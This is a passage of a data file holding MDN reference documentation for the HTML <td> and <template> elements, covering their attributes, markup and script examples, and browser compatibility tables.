  description: "# \\<td\\>: The Table Data Cell element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftd&level=high)\n\nThe `<td>` [HTML](../index) element defines a cell of a table that contains data and may be used as a child of the [`<tr>`](tr) element.\n\n## Try it\n\n#### HTML Demo: \\<td\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Alien football stars\n      </caption>\n      <tr>\n        <th scope=\"col\">Player</th>\n        <th scope=\"col\">Gloobles</th>\n        <th scope=\"col\">Za'taak</th>\n      </tr>\n      <tr>\n        <th scope=\"row\">TR-7</th>\n        <td>7</td>\n        <td>4,569</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Khiresh Odo</th>\n        <td>7</td>\n        <td>7,223</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Mia Oolong</th>\n        <td>9</td>\n        <td>6,219</td>\n      </tr>\n    </table>\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    th[scope='col'] {\n      background-color: #505050;\n      color: #fff;\n    }\n\n    th[scope='row'] {\n      background-color: #d6ecd4;\n    }\n\n    td {\n      text-align: center;\n    }\n\n    tr:nth-of-type(even) {\n      background-color: #eee;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`colspan`](#colspan)  \nContains a non-negative integer value that indicates how many columns the data cell spans or extends. The default value is `1`. User agents dismiss values higher than 1000 as incorrect, setting to the default value (`1`).\n\n[`headers`](#headers)  \nContains a list of space-separated strings, each corresponding to the `id` attribute of the [`<th>`](th) elements that provide headings for this table cell.\n\n[`rowspan`](#rowspan)  \nContains a non-negative integer value that indicates for how many rows the data cell spans or extends. The default value is `1`; if its value is set to `0`, it extends until the end of the table grouping section ([`<thead>`](thead), [`<tbody>`](tbody), [`<tfoot>`](tfoot), even if implicitly defined), that the cell belongs to. Values higher than `65534` are clipped to `65534`.\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`abbr`](#abbr) Deprecated  \nContains a short abbreviated description of the data cell's content. Some user-agents, such as speech readers, may present this description before the content itself. Put the abbreviated content inside the cell and place the (longer) description in the [`title`](../global_attributes/title) attribute, as this attribute is deprecated. Or, preferably, include the content within the data cell, and use CSS to [visually clip overflowing text](https://developer.mozilla.org/en-US/docs/Web/CSS/text-overflow).\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of the data cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and the offset defined by the [`charoff`](#charoff) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property instead, as this attribute is deprecated.\n\n[`axis`](#axis) Deprecated  \nContains a list of space-separated strings, each corresponding to the `id` attribute of a group of cells that the data cell applies to.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of the data cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nDoes nothing. It was originally intended to specify the alignment of the content to a character of the data cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored.\n\n[`charoff`](#charoff) Deprecated  \nDoes nothing. It was originally intended to specify the number of characters to offset the data cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`height`](#height) Deprecated  \nDefines a recommended data cell height. Use the [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height) CSS property instead, as this attribute is deprecated.\n\n[`scope`](#scope) Deprecated  \nDefines the cells that the header (defined in the [`<th>`](th)) element relates to. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `row`, `col`, `rowgroup`, and `colgroup`. Only use this attribute with the [`<th>`](th) element to define the row or column for which it is a header, as this attribute is deprecated for the `<td>` element.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of the data cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property instead, as this attribute is deprecated.\n\n[`width`](#width) Deprecated  \nDefines a recommended data cell width. Use the [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<td>` may only be used within a [`<tr>`](tr) element.\n- When using the [`colspan`](#colspan) and [`rowspan`](#rowspan) attributes to span data cells across multiple columns and rows, cells without these attributes defined (with a default value of `1`) are automatically fitted into free available spaces in the table structure that span 1x1 cells, as illustrated in the following figure:\n  **Note:** These attributes must not be used to overlap cells.\n\n## Examples\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Basic data cells\n\nThis example uses `<td>` elements along with other table-related elements to introduce a basic table with data about the phonetic alphabet.\n\n#### HTML\n\nSome table rows ([`<tr>`](tr) elements) contain both header cells ([`<th>`](th) elements) and data cell `<td>` elements. The [`<th>`](th) element that is the first child of each row forms the first column of the table, with each `<th>` providing the row header for the data cells within that row. Each corresponding `<td>` element contains data aligned with its respective column header and row header cell.\n\n**Note:** Normally, a table head group with column headers would be implemented to make it easier to understand the information in the columns. The [`<thead>`](thead) and [`<tbody>`](tbody) elements would be used to group such rows of headers and data into the respective table head and body sections. This is not implemented in this example to focus on the data cells and reduce the complexity of this example.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>AL fah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td>DELL tah</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nSome basic CSS is used to style the table and its cells. CSS [attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors) and the [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type) pseudo-class are used to alternate the appearance of the cells to make the information in the table easier to understand and identify.\n\ncss\n\n```\ntd,\nth {\n  border: 1px solid rgb(160 160 160);\n  padding: 8px 10px;\n}\n\ntr:nth-of-type(odd) td {\n  background-color: #eee;\n}\n\ntr th[scope=\"row\"] {\n  background-color: #d6ecd4;\n}\n```\n\n#### Result\n\n### Column and row spanning\n\nThis example extends and enhances the basic table from the [previous example](#basic_data_cells) by adding an additional \"ABC\" cell.\n\n#### HTML\n\nAn additional data cell (`<td>` element) is introduced within the first row ([`<tr>`](tr) element). This creates a fourth column in the table.\n\nUsing the [`rowspan`](#rowspan) attribute, the \"ABC\" cell is spanned across the first three rows of the table. The last data cells of the subsequent rows each span two columns. This is done using the [`colspan`](#colspan) attribute, aligning them correctly within the table structure. Note that an additional row ([`<tr>`](tr) element) is added to the table to illustrate this.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>AL fah</td>\n    <td rowspan=\"3\">ABC</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td colspan=\"2\">DELL tah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">E</th>\n    <td>Echo</td>\n    <td colspan=\"2\">ECK oh</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nThe [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type) and [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type) pseudo-classes are used in the CSS to select and style the added \"ABC\" data cell.\n\ncss\n\n```\ntr:first-of-type td:last-of-type {\n  width: 60px;\n  background-color: #505050;\n  color: #fff;\n  font-weight: bold;\n  text-align: center;\n}\n\ntd,\nth {\n  border: 1px solid rgb(160 160 160);\n  padding: 8px 10px;\n}\n\ntr:nth-of-type(odd) td {\n  background-color: #eee;\n}\n\ntr th[scope=\"row\"] {\n  background-color: #d6ecd4;\n}\n```\n\n#### Result\n\n### Associate data cells with header cells\n\nFor more complex relationships between data cells (`<td>` elements) and header cells ([`<th>`](th) elements), using [`<th>`](th) elements with the [`scope`](th#scope) attribute alone may not be sufficient for assistive technologies, especially screen readers.\n\n#### HTML\n\nTo improve the [accessibility](https://developer.mozilla.org/en-US/docs/Glossary/Accessibility) of the [previous example](#column_and_row_spanning) and to allow screen readers, for example, to speak the headers associated with each data cell, the [`headers`](#headers) attribute can be introduced along with [`id`](../global_attributes/id) attributes. Each row header cell ([`<th>`](th) element) associated with the \"ABC\" data cell, i.e., the letters \"A\", \"B\", and \"C\", is given a unique identifier with the [`id`](../global_attributes/id) attribute. The \"ABC\" data cell (`<td>` element) then uses these `id` values in a space-separated list for the [`headers`](#headers) attribute.\n\n**Note:** It's recommended to use more descriptive and useful values for the [`id`](../global_attributes/id) attribute. Each `id` in a document must be unique to that document. In this example, the `id` values are single characters to maintain focus on the concept of the [`headers`](#headers) attribute.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th id=\"a\" scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>AL fah</td>\n    <td headers=\"a b c\" rowspan=\"3\">ABC</td>\n  </tr>\n  <tr>\n    <th id=\"b\" scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th id=\"c\" scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td colspan=\"2\">DELL tah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">E</th>\n    <td>Echo</td>\n    <td colspan=\"2\">ECK oh</td>\n  </tr>\n</table>\n```\n\n#### Result\n\nWhile the [visual result](#result_2) is unchanged from the [previous example table](#column_and_row_spanning), each data cell (`<td>`) is now explicitly associated with its row header cell (`<th>`).\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `td`      | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `abbr`    | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `axis`    | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `bgcolor` | 1       | 12   | 1       | ≤15   | 1      | 18             | 4                   | ≤14           | 1             | 1.0              | 4.4             |     |\n| `char`    | 1       | 12   | No      | 15    | ≤4     | 18             | No                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `charoff` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `colspan` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `headers` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `rowspan` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `scope`   | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `valign`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `width`   | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each data cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of data cells\n- [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height): CSS property to control the recommended data cell height\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each data cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each data cell content\n- [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): CSS property to control the recommended data cell width\n- [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type), [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type), [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type): CSS pseudo-classes to select the desired data cells\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td)"
- name: template
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<template\\>: The Content Template element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since November 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftemplate&level=high)\n\nThe `<template>` [HTML](../index) element serves as a mechanism for holding [HTML](https://developer.mozilla.org/en-US/docs/Glossary/HTML) fragments, which can either be used later via JavaScript or generated immediately into shadow DOM.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`shadowrootmode`](#shadowrootmode)  \nCreates a [shadow root](https://developer.mozilla.org/en-US/docs/Glossary/Shadow_tree) for the parent element. It is a declarative version of the [`Element.attachShadow()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow) method and accepts the same [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values.\n\n[`open`](#open)  \nExposes the internal shadow root DOM for JavaScript (recommended for most use cases).\n\n[`closed`](#closed)  \nHides the internal shadow root DOM from JavaScript.\n\n**Note:** The HTML parser creates a [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) object in the DOM for the first `<template>` in a node with this attribute set to an allowed value. If the attribute is not set, or not set to an allowed value — or if a `ShadowRoot` has already been declaratively created in the same parent — then an [`HTMLTemplateElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement) is constructed. A [`HTMLTemplateElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement) cannot subsequently be changed into a shadow root after parsing, for example, by setting [`HTMLTemplateElement.shadowRootMode`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement/shadowRootMode).\n\n**Note:** You may find the non-standard `shadowroot` attribute in older tutorials and examples that used to be supported in Chrome 90-110. This attribute has since been removed and replaced by the standard `shadowrootmode` attribute.\n\n[`shadowrootclonable`](#shadowrootclonable)  \nSets the value of the [`clonable`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot/clonable) property of a [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) created using this element to `true`. If set, a clone of the shadow host (the parent element of this `<template>`) created with [`Node.cloneNode()`](https://developer.mozilla.org/en-US/docs/Web/API/Node/cloneNode) or [`Document.importNode()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/importNode) will include a shadow root in the copy.\n\n[`shadowrootdelegatesfocus`](#shadowrootdelegatesfocus)  \nSets the value of the [`delegatesFocus`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot/delegatesFocus) property of a [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) created using this element to `true`. If this is set and a non-focusable element in the shadow tree is selected, then focus is delegated to the first focusable element in the tree. The value defaults to `false`.\n\n[`shadowrootserializable`](#shadowrootserializable) Experimental  \nSets the value of the [`serializable`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot/serializable) property of a [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) created using this element to `true`. If set, the shadow root may be serialized by calling the [`Element.getHTML()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/getHTML) or [`ShadowRoot.getHTML()`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot/getHTML) methods with the `options.serializableShadowRoots` parameter set `true`. The value defaults to `false`.\n\n## Usage notes\n\nThere are two main ways to use the `<template>` element.\n\n### Template document fragment\n\nBy default, the element's content is not rendered. The corresponding [`HTMLTemplateElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement) interface includes a standard [`content`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement/content) property (without an equivalent content/markup attribute). This `content` property is read-only and holds a [`DocumentFragment`](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment) that contains the DOM subtree represented by the template. This fragment can be cloned via the [`cloneNode`](https://developer.mozilla.org/en-US/docs/Web/API/Node/cloneNode) method and inserted into the DOM.\n\nBe careful when using the `content` property because the returned `DocumentFragment` can exhibit unexpected behavior. For more details, see the [Avoiding DocumentFragment pitfalls](#avoiding_documentfragment_pitfalls) section below.\n\n### Declarative Shadow DOM\n\nIf the `<template>` element contains the [`shadowrootmode`](#shadowrootmode) attribute with a value of either `open` or `closed`, the HTML parser will immediately generate a shadow DOM. The element is replaced in the DOM by its content wrapped in a [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot), which is attached to the parent element. This is the declarative equivalent of calling [`Element.attachShadow()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow) to attach a shadow root to an element.\n\nIf the element has any other value for `shadowrootmode`, or does not have the `shadowrootmode` attribute, the parser generates a [`HTMLTemplateElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement). Similarly, if there are multiple declarative shadow roots, only the first one is replaced by a [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) — subsequent instances are parsed as [`HTMLTemplateElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement) objects.\n\n## Examples\n\n### Generating table rows\n\nFirst we start with the HTML portion of the example.\n\nhtml\n\n```\n<table id=\"producttable\">\n  <thead>\n    <tr>\n      <td>UPC_Code</td>\n      <td>Product_Name</td>\n    </tr>\n  </thead>\n  <tbody>\n    <!-- existing data could optionally be included here -->\n  </tbody>\n</table>\n\n<template id=\"productrow\">\n  <tr>\n    <td class=\"record\"></td>\n    <td></td>\n  </tr>\n</template>\n```\n\nFirst, we have a table into which we will later insert content using JavaScript code. Then comes the template, which describes the structure of an HTML fragment representing a single table row.\n\nNow that the table has been created and the template defined, we use JavaScript to insert rows into the table, with each row being constructed using the template as its basis.\n\njs\n\n```\n// Test to see if the browser supports the HTML template element by checking\n// for the presence of the template element's content attribute.\nif (\"content\" in document.createElement(\"template\")) {\n  // Instantiate the table with the existing HTML tbody\n  // and the row with the template\n  const tbody = document.querySelector(\"tbody\");\n  const template = document.querySelector(\"#productrow\");\n\n  // Clone the new row and insert it into the table\n  const clone = template.content.cloneNode(true);\n  let td = clone.querySelectorAll(\"td\");\n  td[0].textContent = \"1235646565\";\n  td[1].textContent = \"Stuff\";\n\n  tbody.appendChild(clone);\n\n  // Clone the new row and insert it into the table\n  const clone2 = template.content.cloneNode(true);\n  td = clone2.querySelectorAll(\"td\");\n  td[0].textContent = \"0384928528\";\n  td[1].textContent = \"Acme Kidney Beans 2\";\n\n  tbody.appendChild(clone2);\n} else {\n  // Find another way to add the rows to the table because\n  // the HTML template element is not supported.\n}\n```\n\nThe result is the original HTML table, with two new rows appended to it via JavaScript:\n\n### Implementing a declarative shadow DOM\n\nIn this example, a hidden support warning is included at the beginning of the markup. This warning is later set to be displayed via JavaScript if the browser doesn't support the `shadowrootmode` attribute. Next, there are two [`<article>`](article) elements, each containing nested [`<style>`](style) elements with different behaviors. The first `<style>` element is global to the whole document. The second one is scoped to the shadow root generated in place of the `<template>` element because of the presence of the `shadowrootmode` attribute.\n\nhtml\n\n```\n<p hidden>\n  ⛔ Your browser doesn't support <code>shadowrootmode</code> attribute yet.\n</p>\n<article>\n  <style>\n    p {\n      padding: 8px;\n      background-color: wheat;\n    }\n  </style>\n  <p>I'm in the DOM.</p>\n</article>\n<article>\n  <template shadowrootmode=\"open\">\n    <style>\n      p {\n        padding: 8px;\n        background-color: plum;\n      }\n    </style>\n    <p>I'm in the shadow DOM.</p>\n  </template>\n</article>\n```\n\njs\n\n```\nconst isShadowRootModeSupported =\n  HTMLTemplateElement.prototype.hasOwnProperty(\"shadowRootMode\");\n\ndocument\n  .querySelector(\"p[hidden]\")\n  .toggleAttribute(\"hidden\", isShadowRootModeSupported);\n```\n\n⛔ Your browser doesn't support `shadowrootmode` attribute yet.\n\nI'm in the DOM.\n\nI'm in the Shadow DOM.\n\n### Declarative Shadow DOM with delegated focus\n\nThis example demonstrates how `shadowrootdelegatesfocus` is applied to a shadow root that is created declaratively, and the effect this has on focus.\n\nThe code first declares a shadow root inside a `<div>` element, using the `<template>` element with the `shadowrootmode` attribute. This displays both a non-focusable `<div>` containing text and a focusable `<input>` element. It also uses CSS to style elements with [`:focus`](https://developer.mozilla.org/en-US/docs/Web/CSS/:focus) to blue, and to set the normal styling of the host element.\n\nhtml\n\n```\n<div>\n  <template shadowrootmode=\"open\">\n    <style>\n      :host {\n        display: block;\n        border: 1px dotted black;\n        padding: 10px;\n        margin: 10px;\n      }\n      :focus {\n        outline: 2px solid blue;\n      }\n    </style>\n    <div>Clickable Shadow DOM text</div>\n    <input type=\"text\" placeholder=\"Input inside Shadow DOM\" />\n  </template>\n</div>\n```\n\nThe second code block is identical except that it sets the `shadowrootdelegatesfocus` attribute, which delegates focus to the first focusable element in the tree if a non-focusable element in the tree is selected.\n\nhtml\n\n```\n<div>\n  <template shadowrootmode=\"open\" shadowrootdelegatesfocus>\n    <style>\n      :host {\n        display: block;\n        border: 1px dotted black;\n        padding: 10px;\n        margin: 10px;\n      }\n      :focus {\n        outline: 2px solid blue;\n      }\n    </style>\n    <div>Clickable Shadow DOM text</div>\n    <input type=\"text\" placeholder=\"Input inside Shadow DOM\" />\n  </template>\n</div>\n```\n\nLast of all we use the following CSS to apply a green-yellow border to the parent `<div>` element when it has focus.\n\ncss\n\n```\ndiv:focus {\n  border: 2px solid red;\n}\n```\n\nThe results are shown below. When the HTML is first rendered, the elements have no styling, as shown in the first image. For the shadow root that does not have `shadowrootdelegatesfocus` set you can click anywhere except the `<input>` and the focus does not change (if you select the `<input>` element it will look like the second image).\n\nFor the shadow root with `shadowrootdelegatesfocus` set, clicking on the text (which is non-focusable) selects the `<input>` element, as this is the first focusable element in the tree. This also focusses the parent element as shown below.\n\n## Avoiding DocumentFragment pitfalls\n\nWhen a [`DocumentFragment`](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment) value is passed, [`Node.appendChild`](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild) and similar methods move only the *child nodes* of that value into the target node. Therefore, it is usually preferable to attach event handlers to the children of a `DocumentFragment`, rather than to the `DocumentFragment` itself.\n\nConsider the following HTML and JavaScript:\n\n### HTML\n\nhtml\n\n```\n<div id=\"container\"></div>\n\n<template id=\"template\">\n  <div>Click me</div>\n</template>\n```\n\n### JavaScript\n\njs\n\n```\nconst container = document.getElementById(\"container\");\nconst template = document.getElementById(\"template\");\n\nfunction clickHandler(event) {\n  event.target.append(\" — Clicked this div\");\n}\n\nconst firstClone = template.content.cloneNode(true);\nfirstClone.addEventListener(\"click\", clickHandler);\ncontainer.appendChild(firstClone);\n\nconst secondClone = template.content.cloneNode(true);\nsecondClone.children[0].addEventListener(\"click\", clickHandler);\ncontainer.appendChild(secondClone);\n```\n\n### Result\n\nSince `firstClone` is a `DocumentFragment`, only its children are added to `container` when `appendChild` is called; the event handlers of `firstClone` are not copied. In contrast, because an event handler is added to the first *child node* of `secondClone`, the event handler is copied when `appendChild` is called, and clicking on it works as one would expect.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                             |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Metadata content](../content_categories#metadata_content), [flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [script-supporting element](../content_categories#script-supporting_elements)                                                                                                   |\n| Permitted content                           | No restrictions                                                                                                                                                                                                                                                                                                                                             |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                       |\n| Permitted parents                           | Any element that accepts [metadata content](../content_categories#metadata_content), [phrasing content](../content_categories#phrasing_content), or [script-supporting elements](../content_categories#script-supporting_elements). Also allowed as a child of a [`<colgroup>`](colgroup) element that does *not* have a [`span`](colgroup#span) attribute. |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                                                                                                         |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                                                                                                                                                                         |\n| DOM interface                               | [`HTMLTemplateElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTemplateElement)                                                                                                                                                                                                                                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                            | Desktop   |           |         |         |        |                | Mobile              |               |               |                  |                 |     |\n|----------------------------|-----------|-----------|---------|---------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                            | Chrome    | Edge      | Firefox | Opera   | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `template`                 | 26        | 13        | 22      | 15      | 8      | 26             | 22                  | 14            | 8             | 1.5              | 4.4             |     |\n| `shadowrootclonable`       | 124       | 124       | 125     | 110     | No     | 124            | 125                 | 82            | No            | No               | 124             |     |\n| `shadowrootdelegatesfocus` | 123       | 123       | 123     | 109     | No     | 123            | 123                 | 82            | No            | No               | 123             |     |\n| `shadowrootmode`           | 11190–111 | 11190–111 | 123     | 9776–97 | 16.4   | 11190–111      | 123                 | 7564–75       | 16.4          | 22.015.0–22.0    | 11190–111       |     |\n| `shadowrootserializable`   | 125       | 125       | No      | 111     | No     | 125            | No                  | 83            | No            | No               | 125             |     |\n\n## See also\n\n- [`part`](../global_attributes#part) and [`exportparts`](../global_attributes#exportparts) HTML attributes\n- [`<slot>`](slot) HTML element\n- [`:host`](https://developer.mozilla.org/en-US/docs/Web/CSS/:host), [`:host()`](https://developer.mozilla.org/en-US/docs/Web/CSS/:host_function), and [`:host-context()`](https://developer.mozilla.org/en-US/docs/Web/CSS/:host-context) CSS pseudo-classes\n- [`::part`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) and [`::slotted`](https://developer.mozilla.org/en-US/docs/Web/CSS/::slotted) CSS pseudo-elements\n- [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) interface\n- [Using templates and slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots)\n- [CSS scoping](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scoping) module\n- [Declarative Shadow DOM (with html)](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM#declaratively_with_html) in *Using Shadow DOM*\n- [Declarative shadow DOM](https://web.dev/articles/declarative-shadow-dom) on web.dev (2023)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  